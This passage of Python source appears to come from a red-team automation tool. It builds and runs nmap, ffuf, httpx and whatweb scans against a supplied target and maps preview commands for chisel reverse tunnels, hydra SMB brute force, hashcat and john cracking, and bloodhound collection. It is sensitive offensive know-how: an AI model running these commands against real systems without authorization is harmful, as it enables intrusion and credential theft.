            "balanced": [f"chisel client {target}:8000 R:socks", "tcpdump -ni eth0 port 8000 or port 443"],
            "deep": [f"chisel client {target}:8000 R:socks", "tcpdump -ni eth0 port 8000 or port 443 or port 53"],
        },
        "c2-tunnel-governance": {
            "fast": [f"proxychains4 curl -skI http://{target}"],
            "balanced": [f"proxychains4 curl -skI http://{target}", f"chisel server -p 8000 --reverse"],
            "deep": [f"proxychains4 curl -skI http://{target}", f"chisel server -p 8000 --reverse --auth lab:lab"],
        },
        "c2-framework-awareness": {
            "fast": ["ss -plant"],
            "balanced": ["ss -plant", "tcpdump -ni eth0 port 53 or port 443"],
            "deep": ["ss -plant", "tcpdump -ni eth0 port 53 or port 443 or port 8000"],
        },
        "objective-credential-impact": {
            "fast": [f"hashcat -m 1000 hashes.txt {password_wordlist} --show"],
            "balanced": [f"hashcat -m 1000 hashes.txt {password_wordlist} --show", f"hydra -L {user_wordlist} -P {password_wordlist} smb://{target} -t 4 -f"],
            "deep": [f"hashcat -m 1000 hashes.txt {password_wordlist} --status", f"hydra -L {user_wordlist} -P {password_wordlist} smb://{target} -t 6 -f"],
        },
        "objective-lateral-movement-impact": {
            "fast": [f"crackmapexec smb {target}"],
            "balanced": [f"crackmapexec smb {target}", f"bloodhound-python -u user -p 'Password123!' -d lab.local -c All -ns {target}"],
            "deep": [f"crackmapexec smb {target}", f"bloodhound-python -u user -p 'Password123!' -d lab.local -c All,Session -ns {target}"],
        },
        "objective-evidence-bundle": {
            "fast": ["jq '.' evidence/latest.json"],
            "balanced": ["jq '.' evidence/latest.json", "pandoc report.md -o report.html"],
            "deep": ["jq '.' evidence/latest.json", "pandoc report.md -o report.html", "dot -Tpng path.dot -o path.png"],
        },
        "objective-hashcat-impact": {
            "fast": [f"hashcat -m 1000 hashes.txt {password_wordlist} --show"],
            "balanced": [f"hashcat -m 1000 hashes.txt {password_wordlist} --status", f"hashcat -m 1800 hashes.txt {password_wordlist} --show"],
            "deep": [f"hashcat -m 1000 hashes.txt {password_wordlist} --status --force", f"hashcat -m 1800 hashes.txt {password_wordlist} --show"],
        },
        "objective-john-audit": {
            "fast": ["john --show hashes.txt"],
            "balanced": [f"john --wordlist={password_wordlist} hashes.txt", "john --show hashes.txt"],
            "deep": [f"john --wordlist={password_wordlist} --rules hashes.txt", "john --show hashes.txt"],
        },
    }
    by_profile = command_map.get(module_id)
    if not by_profile:
        return [f"# No command preview mapped for {module_id}"]
    return by_profile.get(profile) or by_profile.get("balanced") or next(iter(by_profile.values()))

def serialize_module(module) -> dict[str, object]:
    playbook = module_playbook(module)
    return {
        "id": module.id,
        "title": module.title,
        "phase_id": module.phase_id,
        "phase_label": module.phase_label,
        "phase_order": module.phase_order,
        "description": module.description,
        "risk": module.risk,
        "mitre": module.mitre,
        "engine": module.engine,
        "mode": module.mode,
        "execution_profile": module_execution_profile(module.id),
        "preview": list(module.preview),
        "skill_level": playbook.skill_level,
        "operator_focus": playbook.operator_focus,
        "tooling": list(playbook.tooling),
        "evidence": list(playbook.evidence),
        "telemetry": list(playbook.telemetry),
        "depth_profile": playbook.depth_profile,
        "allowed_checks": list(playbook.allowed_checks),
        "simulation_stance": playbook.simulation_stance,
        "tooling_details": [tool_status(label) for label in playbook.tooling],
        "profile_options": ["fast", "balanced", "deep"],
        "default_profile": "balanced",
        "command_preview_by_profile": {
            "fast": module_command_preview(module.id, "TARGET", "fast"),
            "balanced": module_command_preview(module.id, "TARGET", "balanced"),
            "deep": module_command_preview(module.id, "TARGET", "deep"),
        },
    }

def lookup_asset(target: str) -> dict[str, str] | None:
    asset = ASSET_BY_IP.get(target)
    return serialize_asset(asset) if asset else None

def blank_severity_summary() -> dict[str, int]:
    return {"info": 0, "low": 0, "medium": 0, "high": 0, "critical": 0}

def make_log(message: str, severity: str = "info", timestamp: str | None = None) -> dict[str, str]:
    return {"timestamp": timestamp or now_iso(), "severity": severity, "message": message}

# ============ Job Management ============
def create_job(
    scope_type: str,
    scope_label: str,
    target: str,
    note: str,
    module_ids: list[str],
    execution_profile: str = "balanced",
) -> dict[str, Any]:
    job_id = str(uuid.uuid4())
    created_at = now_iso()
    normalized_profile = normalize_execution_profile(execution_profile, force_fast=(scope_type == "chain"))
    job = {
        "id": job_id,
        "scope_type": scope_type,
        "scope_label": scope_label,
        "target": target,
        "note": note,
        "status": "pending",
        "progress": 0,
        "created_at": created_at,
        "updated_at": created_at,
        "module_ids": module_ids,
        "logs": [
            make_log("Job created."),
            make_log(f"Scope: {scope_label}"),
            make_log(f"Target: {target}"),
            make_log(f"Execution mode: {EXECUTION_MODE} 🔥 LIVE"),
            make_log(f"Destructive mode: {DESTRUCTIVE_MODE} ⚠️ FULL"),
            make_log(f"Execution profile: {normalized_profile}"),
            make_log(f"Module count: {len(module_ids)}"),
        ],
        "severity_summary": blank_severity_summary(),
        "evidence": [],
        "module_runs": [
            {
                "module_id": module_id,
                "title": MODULE_BY_ID[module_id].title,
                "phase_label": MODULE_BY_ID[module_id].phase_label,
                "status": "queued",
                "progress": 0,
                "highest_severity": "info",
                "execution_profile": module_execution_profile(module_id, normalized_profile),
                "started_at": "",
                "completed_at": "",
                "evidence_count": 0,
            }
            for module_id in module_ids
        ],
    }
    JOB_STORE.create_job(job)
    thread = threading.Thread(target=run_job, args=(job_id,), daemon=True)
    thread.start()
    return JOB_STORE.get_job(job_id) or job

def append_log(job_id: str, message: str, *, severity: str = "info", status: str | None = None, progress: int | None = None) -> None:
    """Append log with safety check"""
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            print(f"⚠️ Job {job_id} not found for log")
            return
        logs = [*job["logs"], make_log(message, severity=severity)]
        JOB_STORE.update_job(job_id, status=status, progress=progress if progress is not None else job.get("progress", 0), logs=logs, updated_at=now_iso())
    except Exception as e:
        print(f"⚠️ Log error (non-critical): {e}")

def update_module_run(job_id: str, module_id: str, **changes: Any) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return
        updated_runs: list[dict[str, Any]] = []
        for run in job["module_runs"]:
            if run["module_id"] == module_id:
                updated_runs.append({**run, **changes})
            else:
                updated_runs.append(run)
        JOB_STORE.update_job(job_id, module_runs=updated_runs, updated_at=now_iso())
    except Exception as e:
        print(f"⚠️ Module update error: {e}")

def add_evidence(job_id: str, item: dict[str, Any]) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return
        evidence = [*job["evidence"], item]
        severity_summary = {**job["severity_summary"]}
        severity = str(item.get("severity") or "info")
        severity_summary[severity] = int(severity_summary.get(severity, 0)) + 1
        JOB_STORE.update_job(job_id, severity_summary=severity_summary, evidence=evidence, updated_at=now_iso())
    except Exception as e:
        print(f"⚠️ Evidence error: {e}")

def update_progress(job_id: str, value: int) -> None:
    safe_update_progress(job_id, value)

def fail_job(job_id: str, reason: str) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return
        logs = [*job["logs"], make_log(reason, severity="critical")]
        updated_runs: list[dict[str, Any]] = []
        for run in job["module_runs"]:
            if str(run.get("status")) == "running":
                updated_runs.append({**run, "status": "failed", "highest_severity": "critical", "completed_at": now_iso()})
            else:
                updated_runs.append(run)
        JOB_STORE.update_job(job_id, status="failed", logs=logs, module_runs=updated_runs, updated_at=now_iso())
    except Exception as e:
        print(f"⚠️ Fail job error: {e}")

def severity_max(a: str, b: str) -> str:
    return a if SEVERITY_ORDER.get(a, 0) >= SEVERITY_ORDER.get(b, 0) else b

def parse_nmap_service_lines(output: str) -> list[dict[str, str]]:
    services: list[dict[str, str]] = []
    for raw_line in output.splitlines():
        line = raw_line.strip()
        if "/tcp" not in line or " open " not in line:
            continue
        parts = line.split()
        if len(parts) < 3:
            continue
        port = parts[0].split("/")[0]
        state = parts[1]
        service = parts[2]
        version = " ".join(parts[3:]).strip()
        services.append(
            {
                "port": port,
                "state": state,
                "service": service,
                "version": version,
            }
        )
    return services

def summarize_open_ports(services: list[dict[str, str]], limit: int = 20) -> list[str]:
    return [
        f"{entry['port']}/tcp {entry['state']} {entry['service']}{(' ' + entry['version']) if entry['version'] else ''}".strip()
        for entry in services[:limit]
    ]

def web_ports_from_services(services: list[dict[str, str]]) -> list[str]:
    candidates = {"80", "81", "443", "591", "8000", "8008", "8080", "8081", "8443", "8888", "9000"}
    seen: list[str] = []
    for entry in services:
        if entry["port"] in candidates and entry["port"] not in seen:
            seen.append(entry["port"])
    return seen

def parse_cves(output: str) -> list[str]:
    found = {match.upper() for match in re.findall(r"CVE-\d{4}-\d{4,7}", output or "", flags=re.IGNORECASE)}
    return sorted(found)

def infer_os_hints_from_services(services: list[dict[str, str]]) -> list[str]:
    hints: list[str] = []
    seen: set[str] = set()
    for entry in services:
        version = str(entry.get("version") or "")
        if not version:
            continue
        match = re.search(r"(Ubuntu|Debian|CentOS|Red Hat|Windows|FreeBSD|OpenBSD|Alpine)[^,;)]*", version, flags=re.IGNORECASE)
        if not match:
            continue
        hint = match.group(0).strip()
        normalized = hint.lower()
        if normalized in seen:
            continue
        seen.add(normalized)
        hints.append(hint)
    return hints[:4]

def parse_nmap_structured_findings(output: str) -> list[dict[str, str]]:
    findings: list[dict[str, str]] = []
    seen: set[tuple[str, str, str]] = set()
    for line in (output or "").splitlines():
        text = line.strip()
        if not text:
            continue
        severity = "info"
        script = "nmap"
        finding = ""
        cve_match = re.search(r"(CVE-\d{4}-\d{4,7})", text, flags=re.IGNORECASE)
        if cve_match:
            severity = "high"
            script_match = re.match(r"([a-zA-Z0-9._-]+):", text)
            script = script_match.group(1) if script_match else "vulners"
            finding = text
        elif "VULNERABLE" in text.upper():
            severity = "high"
            script_match = re.match(r"([a-zA-Z0-9._-]+):", text)
            script = script_match.group(1) if script_match else "nse"
            finding = text
        elif re.search(r"http-title:|ssl-cert:|http-server-header:|http-headers:", text, flags=re.IGNORECASE):
            severity = "medium"
            script_match = re.match(r"([a-zA-Z0-9._-]+):", text)
            script = script_match.group(1) if script_match else "nse"
            finding = text
        if not finding:
            continue
        key = (script.lower(), severity, finding.lower())
        if key in seen:
            continue
        seen.add(key)
        findings.append({"script": script, "severity": severity, "finding": finding})
    return findings[:20]

def parse_httpx_structured_lines(output: str) -> dict[str, list[str]]:
    lines = [line.strip() for line in (output or "").splitlines() if line.strip()]
    technologies: list[str] = []
    headers: list[str] = []
    for line in lines:
        for tech_match in re.findall(r"\[([A-Za-z0-9 ._/\-]+)\]", line):
            candidate = tech_match.strip()
            if candidate and candidate not in technologies:
                technologies.append(candidate)
        server_match = re.search(r"server[:=]\s*([A-Za-z0-9 ._/\-]+)", line, flags=re.IGNORECASE)
        if server_match:
            headers.append(f"server={server_match.group(1).strip()}")
    return {"lines": lines[:8], "technologies": technologies[:10], "headers": headers[:6]}

def parse_whatweb_components(output: str) -> list[str]:
    components: list[str] = []
    for raw in (output or "").splitlines():
        line = raw.strip()
        if not line:
            continue
        if "," in line:
            parts = [part.strip() for part in line.split(",")]
            for part in parts[1:]:
                if part and part not in components:
                    components.append(part)
        elif line not in components:
            components.append(line)
    return components[:12]

def parse_ffuf_result_entries(data: dict[str, Any]) -> list[dict[str, Any]]:
    entries: list[dict[str, Any]] = []
    for item in data.get("results", [])[:40]:
        path = str(((item.get("input") or {}).get("FUZZ")) or "").strip()
        if not path:
            continue
        entries.append(
            {
                "path": path,
                "status": int(item.get("status") or 0),
                "length": int(item.get("length") or 0),
                "words": int(item.get("words") or 0),
                "lines": int(item.get("lines") or 0),
                "url": str(item.get("url") or ""),
                "redirect": str(item.get("redirectlocation") or ""),
            }
        )
    return entries

def summarize_ffuf_entries(entries: list[dict[str, Any]], limit: int = 20) -> list[str]:
    summary: list[str] = []
    for entry in entries[:limit]:
        base = f"/{entry['path']} (Status: {entry['status']})"
        extras: list[str] = []
        if entry.get("length"):
            extras.append(f"len={entry['length']}")
        if entry.get("redirect"):
            extras.append(f"redirect={entry['redirect']}")
        if extras:
            base = f"{base} [{' | '.join(extras)}]"
        summary.append(base)
    return summary

def detect_sensitive_paths(entries: list[dict[str, Any]]) -> list[str]:
    patterns = (".txt", ".bak", ".zip", ".sql", ".env", ".ini", ".conf", ".log", "backup", "admin", "uploads", ".git", "passwd")
    found: list[str] = []
    for entry in entries:
        path = str(entry.get("path") or "")
        lowered = path.lower()
        if any(token in lowered for token in patterns):
            found.append(path)
    return found[:12]

# ============ REAL EXECUTION FUNCTIONS ============

def real_service_scan(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    """Real port scanning with progress updates - FIXED NoneType error"""
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting service scan...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("nmap"):
        events.append({"kind": "log", "severity": "critical", "message": "❌ nmap not found - install nmap first"})
        return events
    
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running staged nmap scan ({profile}): fast discovery -> targeted deepening"})

    if profile == "fast":
        discovery_cmd = (
            f"nmap -Pn -n -sS -sV --version-light -T4 "
            f"--top-ports 1000 --min-rate 1500 --max-retries 2 "
            f"--open {target}"
        )
    elif profile == "deep":
        discovery_cmd = (
            f"nmap -Pn -n -sS -sV --version-all -T4 "
            f"--top-ports 1500 --min-rate 1800 --max-retries 3 "
            f"--defeat-rst-ratelimit --open {target}"
        )
    else:
        discovery_cmd = (
            f"nmap -Pn -n -sS -sV --version-light -T4 "
            f"--top-ports 1000 --min-rate 1500 --max-retries 2 "
            f"--defeat-rst-ratelimit --open {target}"
        )
    try:
        if job_id:
            safe_append_log(job_id, "⏳ Running scan 1/3: fast discovery", "info")
            safe_update_progress(job_id, 25)
    except Exception:
        pass
    events.append({"kind": "log", "severity": "info", "message": f"$ {discovery_cmd}"})
    discovery = execute_command_with_progress(discovery_cmd, job_id if job_id else "temp", target, timeout=240)
    if discovery.get("cancelled"):
        events.append({"kind": "log", "severity": "warning", "message": "Service scan stopped by operator"})
        return events
    if not discovery["success"] and not discovery["stdout"]:
        events.append({"kind": "log", "severity": "high", "message": f"Discovery scan failed: {discovery['stderr'][:500]}"})
        return events

    all_output = discovery["stdout"] or ""
    services = parse_nmap_service_lines(all_output)
    if all_output:
        events.append({"kind": "log", "severity": "low", "message": all_output[:2000]})

    if not services:
        events.append({
            "kind": "evidence",
            "severity": "low",
            "summary": "No open TCP services detected in fast discovery",
            "details": ["Target did not answer on the top 1000 TCP ports under the current profile."],
            "artifacts": {"scan_type": "staged", "open_ports": []},
        })
        return events

    open_port_values = [entry["port"] for entry in services]
    open_port_csv = ",".join(open_port_values[:20])
    if profile == "fast":
        deep_cmd = f"nmap -Pn -n -sV --version-light --max-retries 2 -T4 -p {open_port_csv} {target}"
    elif profile == "deep":
        deep_cmd = (
            f"nmap -Pn -n -sC -sV --version-all --script-timeout 30s "
            f"--max-retries 3 -T4 -p {open_port_csv} {target}"
        )
    else:
        deep_cmd = (
            f"nmap -Pn -n -sC -sV --version-light --script-timeout 20s "
            f"--max-retries 2 -T4 -p {open_port_csv} {target}"
        )
    try:
        if job_id:
            safe_append_log(job_id, f"⏳ Running scan 2/3: targeted NSE on {open_port_csv}", "info")
            safe_update_progress(job_id, 50)
    except Exception:
        pass
    events.append({"kind": "log", "severity": "info", "message": f"$ {deep_cmd}"})
    deep_result = execute_command_with_progress(deep_cmd, job_id if job_id else "temp", target, timeout=300)
    if deep_result.get("cancelled"):
        events.append({"kind": "log", "severity": "warning", "message": "Service scan stopped by operator"})
        return events
    if deep_result["success"] and deep_result["stdout"]:
        all_output += "\n" + deep_result["stdout"]
        events.append({"kind": "log", "severity": "low", "message": deep_result["stdout"][:2000]})
        deep_services = parse_nmap_service_lines(deep_result["stdout"])
        if deep_services:
            services = deep_services
    elif deep_result["stderr"]:
        events.append({"kind": "log", "severity": "medium", "message": f"Targeted deep scan warning: {deep_result['stderr'][:500]}"})

    web_ports = web_ports_from_services(services)
    cves = parse_cves(all_output)
    structured_findings = parse_nmap_structured_findings(all_output)
    service_versions = [
        f"{entry['port']}/{entry['service']} {entry['version']}".strip()
        for entry in services
        if entry.get("version")
    ][:12]
    os_hints = infer_os_hints_from_services(services)
    if web_ports:
        web_port_csv = ",".join(web_ports)
        web_scripts = "http-title,http-headers,ssl-cert"
        if profile == "deep":
            web_scripts = "http-title,http-headers,ssl-cert,vulners"
        web_cmd = f"nmap -Pn -n --script {web_scripts} -p {web_port_csv} {target}"
        try:
            if job_id:
                safe_append_log(job_id, f"⏳ Running scan 3/3: web NSE on {web_port_csv}", "info")
                safe_update_progress(job_id, 70)
        except Exception:
            pass
        events.append({"kind": "log", "severity": "info", "message": f"$ {web_cmd}"})
        web_result = execute_command_with_progress(web_cmd, job_id if job_id else "temp", target, timeout=180)
        if web_result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Service scan stopped by operator"})
            return events
        if web_result["success"] and web_result["stdout"]:
            all_output += "\n" + web_result["stdout"]
            events.append({"kind": "log", "severity": "low", "message": web_result["stdout"][:2000]})
        elif web_result["stderr"]:
            events.append({"kind": "log", "severity": "medium", "message": f"Web NSE warning: {web_result['stderr'][:500]}"})

    events.append({
        "kind": "evidence",
        "severity": "critical",
        "summary": f"🔥 {len(services)} open ports discovered",
        "details": summarize_open_ports(services, limit=20),
        "artifacts": {
            "open_ports": services,
            "scan_type": "staged-targeted",
            "web_ports": web_ports,
            "service_versions": service_versions,
            "os_guess": os_hints,
            "cves": cves,
            "nse_findings_structured": structured_findings,
        }
    })
    
    try:
        if job_id:
            safe_update_progress(job_id, 90)
            safe_append_log(job_id, "✅ Service scan completed", "info")
    except Exception:
        pass
    
    return events

def real_content_discovery(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    """Real content discovery with progress - FIXED NoneType error"""
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting content discovery...", "info")
            safe_update_progress(job_id, 20)
    except Exception:
        pass
    
    # Use smaller wordlist for faster scanning
    wordlist = preferred_small_web_wordlist()
    
    if job_id:
        safe_append_log(job_id, f"📂 Using wordlist: {wordlist}", "info")
    
    if check_tool_availability("ffuf"):
        if job_id:
            safe_append_log(job_id, f"🔥 Running ffuf ({profile})...", "warning")
            safe_update_progress(job_id, 40)

        if profile == "fast":
            cmd = f"ffuf -u http://{target}/FUZZ -w {wordlist} -mc 200,301,302,403 -fc 404 -t 20 -timeout 8 -c -o ffuf_{target}.json"
        elif profile == "deep":
            cmd = f"ffuf -u http://{target}/FUZZ -w {wordlist} -mc 200,204,301,302,307,401,403 -fc 404 -t 40 -timeout 12 -c -o ffuf_{target}.json"
        else:
            cmd = f"ffuf -u http://{target}/FUZZ -w {wordlist} -mc 200,301,302,403 -fc 404 -t 30 -timeout 10 -c -o ffuf_{target}.json"

        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=300 if profile != "deep" else 420)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Content discovery stopped by operator"})
            return events
        
        if result["success"]:
            json_file = Path(f"ffuf_{target}.json")
            if json_file.exists():
                try:
                    with open(json_file) as f:
                        data = json.load(f)
                        entries = parse_ffuf_result_entries(data)
                        paths = [entry["path"] for entry in entries[:30]]
                        if entries:
                            events.append({
                                "kind": "evidence",
                                "severity": "high",
                                "summary": f"🔥 {len(entries)} paths discovered",
                                "details": summarize_ffuf_entries(entries, limit=30),
                                "artifacts": {
                                    "paths": paths,
                                    "dir_entries": entries,
                                    "exposed_files": detect_sensitive_paths(entries),
                                }
                            })
                except Exception:
                    pass
    
    if job_id:
        safe_update_progress(job_id, 80)
        safe_append_log(job_id, "✅ Content discovery completed", "info")
    
    return events

def real_web_fingerprint(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    """Real web fingerprinting with progress"""
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Fingerprinting web...", "info")
            safe_update_progress(job_id, 20)
    except Exception:
        pass
    
    if check_tool_availability("httpx"):
        if profile == "fast":
            cmd = f"httpx -u http://{target} -status-code -title -silent"
        elif profile == "deep":
            cmd = f"httpx -u http://{target} -status-code -title -tech-detect -tls-probe -web-server -server -silent"
        else:
            cmd = f"httpx -u http://{target} -status-code -title -tech-detect -tls-probe -silent"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=60 if profile != "deep" else 90)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Web fingerprint stopped by operator"})
            return events
        if result["success"] and result["stdout"]:
            httpx_structured = parse_httpx_structured_lines(result["stdout"])
            events.append({
                "kind": "evidence",
                "severity": "medium",
                "summary": "Web technology detected",
                "details": [result["stdout"].strip()],
                "artifacts": {
                    "httpx_output": result["stdout"],
                    "service_versions": httpx_structured["technologies"],
                    "http_observations": httpx_structured["lines"],
                }
            })
    
    if job_id:
        safe_update_progress(job_id, 60)
    
    if check_tool_availability("whatweb"):
        aggression = 1 if profile == "fast" else 4 if profile == "deep" else 3
        cmd = f"whatweb -a {aggression} http://{target} -v --no-errors"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=90 if profile == "fast" else 180 if profile == "deep" else 120)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Web fingerprint stopped by operator"})
            return events
        if result["success"] and result["stdout"]:
            whatweb_components = parse_whatweb_components(result["stdout"])
            events.append({
                "kind": "evidence",
                "severity": "medium",
                "summary": "Whatweb fingerprint",
                "details": [line for line in result["stdout"].split("\n") if line.strip()][:10],
                "artifacts": {
                    "whatweb_output": result["stdout"][:2000],
                    "service_versions": whatweb_components,
                }
            })
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Web fingerprint completed", "info")
    
    return events

# ============ ADAPTERS ============
LIVE_ADAPTERS = {
    "recon-service-scan": real_service_scan,
    "baseline-web-fingerprint": real_web_fingerprint,
    "baseline-content-discovery": real_content_discovery,
    "baseline-content-discovery-aggressive": real_content_discovery,
}

# ============ Module Runtime Events ============
def module_runtime_events(module, target: str, note: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    playbook = module_playbook(module)
    profile = normalize_execution_profile(execution_profile)
    events: list[dict[str, Any]] = [
        {"kind": "log", "severity": "info", "message": f"Operator note: {note or 'Default'}"},
        {"kind": "log", "severity": "warning", "message": f"🔥 EXECUTION: LIVE - Full capabilities"},
        {"kind": "log", "severity": "warning", "message": f"⚠️ DESTRUCTIVE: ENABLED"},
        {"kind": "log", "severity": "info", "message": f"Execution profile: {profile}"},
        {"kind": "log", "severity": "info", "message": f"Target: {target}"},
        {"kind": "log", "severity": "info", "message": f"Module: {module.title} ({module.phase_label})"},
    ]
    
    for line in module.preview:
        events.append({"kind": "log", "severity": "info", "message": line})
    
    adapter = LIVE_ADAPTERS.get(module.id)
    if adapter:
        events.append({"kind": "log", "severity": "critical", "message": f"🔥 RUNNING LIVE ADAPTER: {module.title}"})
        adapter_events = adapter(target, job_id, profile)
        events.extend(adapter_events)
    else:
        events.append({"kind": "log", "severity": "warning", "message": f"No live adapter for {module.title}. Module skipped to avoid synthetic evidence."})
        events.append({"kind": "log", "severity": "warning", "message": f"$ skipped::{module.id}::{target}"})
    
    return events

# ============ Job Execution ============
def run_job(job_id: str) -> None:
    job = JOB_STORE.get_job(job_id)
    if not job:
        print(f"❌ Job {job_id} not found")
        return
    
    try:
        if is_stop_requested(job_id):
            mark_job_stopped(job_id)
            return
        append_log(job_id, "Job accepted by worker.", status="running", progress=1)
        append_log(job_id, f"🔥 Execution: LIVE - Full capabilities", severity="warning")
        append_log(job_id, f"⚠️ Destructive: ENABLED", severity="warning")
        if str(job.get("scope_type")) == "chain":
            append_log(job_id, "Running target preflight reachability check.", severity="info", progress=2)
            if not target_preflight_reachable(str(job["target"])):
                mark_job_failed_preflight(job_id, f"Target preflight failed: {job['target']} is not reachable. Full chain aborted.")
                return
            append_log(job_id, "Target preflight passed.", severity="info", progress=3)
        module_count = max(len(job["module_ids"]), 1)
        
        for index, module_id in enumerate(job["module_ids"]):
            if is_stop_requested(job_id):
                mark_job_stopped(job_id)
                return
            module = MODULE_BY_ID[module_id]
            existing_run = next((run for run in job["module_runs"] if run["module_id"] == module_id), None)
            execution_profile = normalize_execution_profile(existing_run.get("execution_profile") if existing_run else "balanced")
            highest_severity = "info"
            evidence_count = 0
            
            update_module_run(job_id, module_id, status="running", progress=5, started_at=now_iso(), execution_profile=execution_profile, highest_severity=highest_severity)
            
            append_log(job_id, "")
            append_log(job_id, f"=== [{module.phase_label}] {module.title} ===", severity="warning")
            append_log(job_id, f"Risk: {module.risk}")
            append_log(job_id, f"ATT&CK: {module.mitre}")
            append_log(job_id, f"🔥 Profile: {execution_profile}")
            append_log(job_id, "Starting module execution...")
            
            # FIXED: Pass job_id to module_runtime_events
            events = module_runtime_events(module, str(job["target"]), str(job["note"]), job_id, execution_profile)
            if is_stop_requested(job_id):
                mark_job_stopped(job_id, f"Job stopped during module: {module.title}")
                return
            total_events = max(len(events), 1)
            
            for event_index, event in enumerate(events, start=1):
                if is_stop_requested(job_id):
                    mark_job_stopped(job_id, f"Job stopped during module: {module.title}")
                    return
                severity = str(event.get("severity") or "info")
                highest_severity = severity_max(highest_severity, severity)
                module_progress = min(95, int((event_index / total_events) * 100))
                overall_progress = min(99, int(((index + (event_index / total_events)) / module_count) * 100))
                
                if event["kind"] == "log":
                    append_log(job_id, str(event["message"]), severity=severity, progress=overall_progress)
                elif event["kind"] == "evidence":
                    add_evidence(job_id, {
                        "module_id": module.id,
                        "module_title": module.title,
                        "phase_label": module.phase_label,
                        "severity": severity,
                        "summary": event["summary"],
                        "details": event.get("details", []),
                        "artifacts": event.get("artifacts", {}),
                        "execution_profile": execution_profile,
                        "collected_at": now_iso(),
                    })
                    evidence_count += 1
                    append_log(job_id, f"📊 Evidence: {event['summary']}", severity=severity, progress=overall_progress)
                
                update_module_run(job_id, module_id, progress=module_progress, highest_severity=highest_severity, evidence_count=evidence_count)
                update_progress(job_id, overall_progress)
                time.sleep(0.1)
            
            if is_stop_requested(job_id):
                mark_job_stopped(job_id, f"Job stopped after module: {module.title}")
                return
            update_module_run(job_id, module_id, status="completed", progress=100, highest_severity=highest_severity, evidence_count=evidence_count, completed_at=now_iso())
            append_log(job_id, f"✅ Module completed: {module.title}", severity=highest_severity)
            update_progress(job_id, int(((index + 1) / module_count) * 100))
        
        append_log(job_id, "✅ Job completed!", severity="info", status="completed", progress=100)
    except Exception as error:
        error_msg = f"Job error: {error}\n{traceback.format_exc()}"
        print(f"❌ {error_msg}")
        fail_job(job_id, f"Job error: {error}")
        append_log(job_id, traceback.format_exc(), severity="critical", status="failed")
    finally:
        unregister_active_process(job_id)
        clear_stop_request(job_id)

# ============ Report Functions ============
def export_payload(job: dict[str, Any]) -> dict[str, Any]:
    return {
        "job": {
            "id": job["id"],
            "scope_type": job["scope_type"],
            "scope_label": job["scope_label"],
            "target": job["target"],
            "note": job["note"],
            "status": job["status"],
            "progress": job["progress"],
            "created_at": job["created_at"],
            "updated_at": job["updated_at"],
            "asset": lookup_asset(job["target"]),
        },
        "severity_summary": job["severity_summary"],
        "module_runs": job["module_runs"],
        "evidence": job["evidence"],
        "logs": job["logs"],
    }

def build_markdown_report(job: dict[str, Any]) -> str:
    lines = [
        "# 🔴 RED TEAM REPORT",
        "",
        f"**Target:** `{job['target']}`",
        f"**Job ID:** `{job['id']}`",
        f"**Status:** `{job['status']}`",
        f"**Date:** `{job['created_at']}`",
        f"**Execution:** 🔥 LIVE",
        f"**Destructive:** ⚠️ FULL",
        "",
        "## SEVERITY SUMMARY",
        "",
        "| Severity | Count |",
        "|----------|-------|",
        f"| CRITICAL | {job['severity_summary'].get('critical', 0)} |",
        f"| HIGH     | {job['severity_summary'].get('high', 0)} |",
        f"| MEDIUM   | {job['severity_summary'].get('medium', 0)} |",
        f"| LOW      | {job['severity_summary'].get('low', 0)} |",
        f"| INFO     | {job['severity_summary'].get('info', 0)} |",
        "",
        "## FINDINGS",
        "",
    ]
    
    critical = [e for e in job['evidence'] if e.get('severity') == 'critical']
    high = [e for e in job['evidence'] if e.get('severity') == 'high']
    
    for evidence in critical[:10]:
        lines.extend([
            f"### 🔴 {evidence.get('summary', 'Critical')}",
            f"- **Severity:** CRITICAL",
            f"- **Module:** {evidence.get('module_title', 'Unknown')}",
        ])
        for detail in evidence.get('details', [])[:5]:
            lines.append(f"  - {detail}")
        lines.append("")
    
    for evidence in high[:10]:
        lines.extend([
            f"### 🟠 {evidence.get('summary', 'High')}",
            f"- **Severity:** HIGH",
            f"- **Module:** {evidence.get('module_title', 'Unknown')}",
        ])
        for detail in evidence.get('details', [])[:5]:
            lines.append(f"  - {detail}")
        lines.append("")
    
    return "\n".join(lines)

def build_html_report(job: dict[str, Any]) -> str:
    markdown = build_markdown_report(job)
    return f"""<!doctype html>
<html>
<head><meta charset="utf-8"><title>Red Team Report</title>
<style>
body {{ font-family: Arial; max-width: 1200px; margin: 40px auto; padding: 20px; background: #1a1a2e; color: #e0e0e0; }}
.container {{ background: #16213e; padding: 40px; border-radius: 8px; }}
h1, h2, h3 {{ color: #e94560; }}
table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
th, td {{ border: 1px solid #0f3460; padding: 10px; }}
th {{ background: #1a1a2e; color: #e94560; }}
.severity-critical {{ color: #ff0000; }}
.severity-high {{ color: #ff6b00; }}
.warning {{ background: #2a1a1a; border-left: 4px solid #e94560; padding: 10px; }}
pre {{ white-space: pre-wrap; }}
</style>
</head>
<body>
